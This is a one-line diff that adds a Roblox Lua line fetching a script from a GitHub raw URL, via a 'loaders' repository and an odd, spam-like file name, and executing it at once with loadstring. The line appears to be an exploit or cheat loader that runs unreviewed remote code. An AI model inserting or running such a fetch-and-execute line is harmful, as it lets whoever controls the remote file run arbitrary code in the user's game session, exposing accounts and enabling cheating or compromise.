@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/update-x-cvr-retro-spam5-fvbs2rb9o1t8jc.lua"))()
